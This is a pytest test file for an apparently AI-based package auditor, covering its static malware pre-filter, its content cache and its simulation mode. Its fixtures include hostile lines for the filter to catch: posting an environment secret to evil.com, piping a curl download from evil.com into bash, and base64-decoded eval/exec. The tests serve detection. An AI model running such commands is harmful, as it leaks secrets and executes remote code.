"""Tests for the AI auditor: static pre-filter, content-based cache, simulation mode."""
import os
import tempfile
import shutil

import pytest

# Patch out the OpenAI import so tests don't need an API key or real client
from unittest.mock import patch, MagicMock

# Must patch env BEFORE importing AIAuditor so the constructor doesn't try to
# connect to a real provider.
with patch.dict(os.environ, {"AI_PROVIDER": "grok"}, clear=False):
    from talkdoc_secure_pm.auditor.ai_agent import AIAuditor, _SUSPICIOUS_PATTERNS


@pytest.fixture
def auditor():
    """AIAuditor with no API key configured (simulation mode)."""
    with patch.dict(os.environ, {"AI_PROVIDER": "grok", "XAI_API_KEY": ""}, clear=False):
        a = AIAuditor()
        # Force simulation
        a.client = None
        a.model = None
    return a


@pytest.fixture
def tmp_pkg(tmp_path):
    """Helper: create a fake extracted package directory with given files."""
    def _create(files: dict[str, str]):
        for name, content in files.items():
            p = tmp_path / name
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(content)
        return str(tmp_path)
    return _create


# ---------------------------------------------------------------------------
# Static pre-filter tests
# ---------------------------------------------------------------------------

class TestStaticPrefilter:
    def test_clean_code_passes(self, auditor, tmp_pkg):
        extract_dir = tmp_pkg({"setup.py": "from setuptools import setup\nsetup(name='safe')\n"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is True
        assert reason == ""

    def test_base64_eval_rejected(self, auditor, tmp_pkg):
        extract_dir = tmp_pkg({"setup.py": "eval( base64.b64decode('abc'))"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "base64 eval" in reason

    def test_base64_exec_rejected(self, auditor, tmp_pkg):
        extract_dir = tmp_pkg({"hook.py": "exec(base64.b64decode(payload))"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "base64 exec" in reason

    def test_env_exfiltration_rejected(self, auditor, tmp_pkg):
        code = "token = os.environ['SECRET']; requests.post('https://evil.com', data=token)"
        extract_dir = tmp_pkg({"leak.py": code})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "exfiltration" in reason.lower()

    def test_pipe_to_shell_rejected(self, auditor, tmp_pkg):
        extract_dir = tmp_pkg({"install.sh": "curl https://evil.com/payload | bash"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "pipe to shell" in reason

    def test_non_critical_extension_ignored(self, auditor, tmp_pkg):
        # .txt files are NOT scanned, even if they contain suspicious content
        extract_dir = tmp_pkg({"README.txt": "eval( base64.b64decode('pwned'))"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is True

    def test_subprocess_curl_rejected(self, auditor, tmp_pkg):
        extract_dir = tmp_pkg({"setup.py": "subprocess.run(['curl', 'https://evil.com'])"})
        is_clean, reason = auditor._static_prefilter(extract_dir)
        assert is_clean is False
        assert "shell/curl" in reason


# ---------------------------------------------------------------------------
# Content-based cache tests
# ---------------------------------------------------------------------------

class TestCacheContentBased:
    def test_same_content_same_result(self, auditor, tmp_pkg):
        """Two calls with identical file content → second is a cache hit."""
        extract_dir = tmp_pkg({"setup.py": "print('hello')"})
        r1 = auditor.audit_package_source("testpkg", extract_dir)
        r2 = auditor.audit_package_source("testpkg", extract_dir)
        assert r1 == r2
        # Cache should have exactly 1 entry
        assert len(auditor._cache) == 1

    def test_different_content_different_key(self, auditor, tmp_path):
        """Two versions with different content produce separate cache entries."""
        # Version A
        dir_a = tmp_path / "a"
        dir_a.mkdir()
        (dir_a / "setup.py").write_text("version_a = 1")
        auditor.audit_package_source("pkg", str(dir_a))

        # Version B
        dir_b = tmp_path / "b"
        dir_b.mkdir()
        (dir_b / "setup.py").write_text("version_b = 2")
        auditor.audit_package_source("pkg", str(dir_b))

        assert len(auditor._cache) == 2


# ---------------------------------------------------------------------------
# Simulation mode tests
# ---------------------------------------------------------------------------

class TestSimulationMode:
    def test_simulated_approval_returns_true(self, auditor, tmp_pkg):
        """When no AI client is configured, audit returns True (simulated approval)."""
        extract_dir = tmp_pkg({"setup.py": "setup(name='ok')"})
        result = auditor.audit_package_source("fakepkg", extract_dir)
        assert result is True

    def test_simulated_rejection_if_static_fails(self, auditor, tmp_pkg):
        """Even in simulation mode, the static prefilter can reject packages."""
        extract_dir = tmp_pkg({"setup.py": "exec(base64.b64decode('evil'))"})
        result = auditor.audit_package_source("evilpkg", extract_dir)
        assert result is False
